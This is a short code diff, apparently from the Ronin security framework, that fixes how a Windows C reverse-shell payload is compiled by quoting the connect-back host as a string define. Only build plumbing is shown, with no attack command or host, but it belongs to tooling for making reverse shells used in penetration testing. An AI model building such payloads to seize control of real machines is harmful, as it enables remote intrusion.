@@ -70,7 +70,7 @@ module Ronin
           def build
             tempfile('reverse_shell', ext: '.c') do |tempfile|
               compile(SOURCE_FILE, defs: {
-                                     'CLIENT_IP'   => params[:host],
+                                     'CLIENT_IP'   => "\"#{params[:host]}\"",
                                      'CLIENT_PORT' => params[:port]
                                    },
                                    libs:   %w[ws2_32],
